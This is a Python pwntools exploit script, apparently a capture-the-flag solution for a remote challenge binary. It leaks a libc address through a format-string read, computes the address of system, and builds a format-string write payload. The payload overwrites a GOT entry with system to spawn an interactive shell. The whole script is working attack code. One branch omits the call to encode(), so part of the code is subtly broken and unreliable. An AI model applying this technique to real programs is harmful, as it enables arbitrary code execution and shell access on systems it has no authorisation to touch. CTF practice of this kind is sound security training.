#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

# p = process(exe.path)
# input()
p = remote('chall.v1t.site', 30213)

p.sendlineafter(b'name?', b'/bin/sh\x00')

p.sendlineafter(b'Speak loud what do you want', b'%27$p')

p.recvuntil(b'0x')
leak = int(p.recvline().strip(), 16)
log.info(f'leak: {hex(leak)}')
libc_base = leak - 0x2a1ca
log.info(f'libc base: {hex(libc_base)}')
system = libc_base + 0x58750
log.info(f'system: {hex(system)}')

puts_got = exe.got['puts']
log.info(f'puts@GOT: {hex(puts_got)}')

leak_system = system

part1 = (leak_system & 0xff)
part2 = (leak_system >> 8) & 0xffff
part3 = (leak_system >> 24) & 0xffff
part4 = (leak_system >> 40) & 0xff

print('Split Address', hex(part1), hex(part2), hex(part3), hex(part4))

writes = [
    (part1, 0x404000, 1),
    (part2, 0x404001, 2),
    (part3, 0x404003, 2),
    (part4, 0x404005, 1)
]

writes.sort()

part1, addr1, sz1 = writes[0]
part2, addr2, sz2 = writes[1]
part3, addr3, sz3 = writes[2]
part4, addr4, sz4 = writes[3]

# print(hex(part1), hex(part2))

if (sz1 == 1):
    payload = f'%{part1}c%14$hhn'.encode()
else:
    payload = f'%{part1}c%14$hn'.encode()

if (sz2 == 1):
    payload += f'%{(part2 - part1)}c%15$hhn'.encode()
else:
    payload += f'%{(part2 - part1)}c%15$hn'.encode()

if (sz3 == 1):
    payload += f'%{(part3 - part2)}c%16$hhn'.encode()
else:
    payload += f'%{(part3 - part2)}c%16$hn'.encode()

if (sz4 == 1):
    payload += f'%{(part4 - part3)}c%17$hhn'.encode
else:
    payload += f'%{(part4 - part3)}c%17$hn'.encode()

payload = payload.ljust(0x30, b'A')
payload += p64(addr1)
payload += p64(addr2)
payload += p64(addr3)
payload += p64(addr4)

# payload = f'%{0xabcd}c%14$n'.encode()
# payload = payload.ljust(0x30, b'A')
# payload += p64(puts_got)

p.sendline(payload)

p.interactive()
